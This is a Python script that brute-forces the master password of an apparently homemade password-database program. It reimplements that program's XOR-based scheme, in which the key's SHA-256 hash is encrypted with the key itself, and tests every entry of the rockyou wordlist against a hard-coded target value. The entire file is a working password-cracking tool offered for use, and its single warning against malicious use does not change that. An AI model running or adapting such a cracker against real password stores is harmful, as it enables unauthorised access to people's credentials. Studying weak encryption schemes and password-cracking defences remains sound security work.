import hashlib
import progressbar
import time

# this code can be used to brute force the master password of the password database
# do not use this for malicious purposes

# change the following variables (original master password and the password list)
# rockyou needs about 31 minutes to fully process

# so the key is encrypted with it's own hash, so you can just brute force the key by using a random key, hash it and encrypt it with itself
# enter the original password from the database (first line) below
originalPasswordHash = '069004075075067087075092020000065075071091069085069080023067018090068002072005016069069086064083071082069067068011066000070000018017021011022082066000066066018009069086065005066070067093022092'

# Multiple password lists, just use the one you want
password_list = '/usr/share/wordlists/rockyou.txt'
#password_list = '/usr/share/wordlists/john.lst'



#-------------------------------------------------------------------------------
# Start functions section
#-------------------------------------------------------------------------------


# this is just a const of the number dict file:
numberDict = {
    0: "0110000",
    1: "0110001",
    2: "0110010",
    3: "0110011",
    4: "0110100",
    5: "0110101",
    6: "0110110",
    7: "0110111",
    8: "0111000",
    9: "0111001"
}

# this is just the xor function of the original program
def xor(a, b):
    # perform the bitwise x-or on the a and b binary string inputted
    ans = ""
    # Loop to iterate over the
    # Binary Strings
    for i in range(len(a)):
    # If the Character matches
        if (str(a[i]) == str(b[i])):
            ans += "0"
        else:
            ans += "1"
    return ans
    
# this is the isInt function of the original program
def isInt(s):
    # check if an inputted character is type = string
    try:
        int(s)
        return True
    except ValueError:
        return False
    
# this is the string to binary function of the original program
def fnStrToBin(StringToBin):
    # translate a string into a binary string
    arrCharsBin = []
    for char in [char for char in StringToBin]:
        if isInt(char):
            add = numberDict[int(char)].zfill(8)
            arrCharsBin.append(f"{add}")
        else:
            add = bin(ord(char)).replace('0b', '').zfill(8)
            arrCharsBin.append(f"{add}")
    returnStr = ''
    for charBin in arrCharsBin:
        returnStr += charBin
    return returnStr

# this is the encryption function of the original program
def fnEncryptString(strPassword, strKey):
    # Password String to binary string
    strBinaryPW = fnStrToBin(strPassword)

    # Key string to binary string
    strBinaryKey = fnStrToBin(strKey)
    # repeat key until every bit from pw can be xor'ed with the key
    try:
        strBinaryKey = (
            strBinaryKey * (int(len(strBinaryPW)/len(strBinaryKey))+1))[:len(strBinaryPW)]
    except ZeroDivisionError:
        # happens if no key give
        exit()
    # Perform the binary xor operation
    strXor = xor(strBinaryPW, strBinaryKey)

    # Create the cipher text with the result of the binary xor
    strCipherText = ''
    for strcharcipherText in range(0, len(strXor), 8):
        strCipherText += str(
            int(strXor[strcharcipherText: strcharcipherText + 8], 2)).zfill(3)
    # return the cipher text
    return strCipherText

#-------------------------------------------------------------------------------
# End functions section
#-------------------------------------------------------------------------------




#-------------------------------------------------------------------------------
# Here starts the real program, the rest is mostly copied from the original program
#-------------------------------------------------------------------------------

# get the number of lines in the file:
with open(password_list, 'r', encoding='latin-1') as password_file:
    number_of_lines = len(password_file.readlines())

print(f"The password file contains {number_of_lines} passwords")

# start the progressbar
bar = progressbar.ProgressBar(maxval=number_of_lines, \
    widgets=[progressbar.Bar('=', '[', ']'), ' ', progressbar.Percentage()])
bar.start()

# start time, used for time calculations
startTime = time.time()

try:
    # Tried latin because of the encoding error
    with open(password_list, 'r', encoding='latin-1') as file:
        for count,line in enumerate(file):
            # the strip is necessary because the line does also contain the \n
            newKey = line.strip()
            # script will just exit without an error if the line is empty
            if newKey == "":
                continue
            strKeyHash = hashlib.sha256(newKey.strip().encode()).hexdigest()
            strEncryptedHash = fnEncryptString(strKeyHash, newKey)
            bar.update(count + 1)
            #print(f"{count} - {newKey}")
            #print(f"{count} - Comparing {strEncryptedHash} ({newKey}) with {originalPasswordHash}")
            if strEncryptedHash == originalPasswordHash:
                bar.finish()
                endTime = time.time()
                print(f"The password could be cracked: {newKey}, it took {count} tries in {endTime-startTime} seconds")
                # close the file so that there is no left over in memory and exit
                file.close()
                exit(0)
# handle unicode errors that can occur when something in the password list is encoded using a different encoding
except UnicodeDecodeError as e:
    print(f"UnicodeDecodeError, Count is {count}")
    print(e)
    file.close()
    bar.finish()
    exit(1)

# Program finish if the password could not be cracked
bar.finish()
endTime = time.time()
print(f"The password could not be cracked with the password list provided. Calculations took {endTime-startTime} seconds")
# close the file so that there is no left over in memory and exit
file.close()
exit(0)